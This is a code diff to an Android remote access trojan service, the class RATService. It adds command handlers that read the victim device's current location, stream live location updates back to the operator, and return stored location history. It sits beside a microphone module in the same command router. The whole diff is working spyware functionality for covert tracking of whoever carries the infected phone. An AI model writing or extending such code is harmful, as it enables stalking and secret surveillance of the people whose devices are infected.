@@ -753,19 +753,59 @@ public class RATService extends Service {
                 }
                 break;
 
-            case "location":
-            case "get_location":
-                if (locationModule != null) {
-                    String result = locationModule.getLocation();
-                    sendCommand("LOCATION|" + result);
-                } else {
-                    sendCommand("LOCATION|ERROR: Location module not available");
-                }
-                break;
+// Add these cases in the routeCommand method
 
-            case "location_stream":
-                handleLocationStreamCommand(args);
-                break;
+case "location":
+case "get_location":
+    if (locationModule != null) {
+        Log.d(TAG, "📍 Getting location");
+        String result = locationModule.getLocation();
+        sendCommand("LOCATION|" + result);
+    } else {
+        sendCommand("LOCATION|{\"error\":\"Location module not available\"}");
+    }
+    break;
+
+case "location_stream":
+    if (args.equals("start") || args.equals("begin") || args.equals("on")) {
+        if (locationModule != null) {
+            Log.d(TAG, "📍 Starting location tracking");
+            locationModule.startTracking(new LocationModule.LocationCallback() {
+                @Override
+                public void onLocationResult(String locationJson) {
+                    sendCommand("LOCATION_UPDATE|" + locationJson);
+                }
+                
+                @Override
+                public void onError(String error) {
+                    sendCommand("LOCATION_ERROR|{\"error\":\"" + error + "\"}");
+                }
+            });
+            sendCommand("LOCATION_STREAM|started");
+        } else {
+            sendCommand("LOCATION_STREAM|error: Location module not available");
+        }
+    } else if (args.equals("stop") || args.equals("end") || args.equals("off")) {
+        if (locationModule != null) {
+            locationModule.stopTracking();
+            sendCommand("LOCATION_STREAM|stopped");
+        } else {
+            sendCommand("LOCATION_STREAM|error: Location module not available");
+        }
+    } else {
+        sendCommand("LOCATION_STREAM|error: Unknown parameter. Use 'start' or 'stop'");
+    }
+    break;
+
+case "location_history":
+    if (locationModule != null) {
+        Log.d(TAG, "📍 Getting location history");
+        String result = locationModule.getLocationHistory();
+        sendCommand("LOCATION_HISTORY|" + result);
+    } else {
+        sendCommand("LOCATION_HISTORY|{\"error\":\"Location module not available\"}");
+    }
+    break;
 
             case "mic_path":
                 if (micModule != null) {
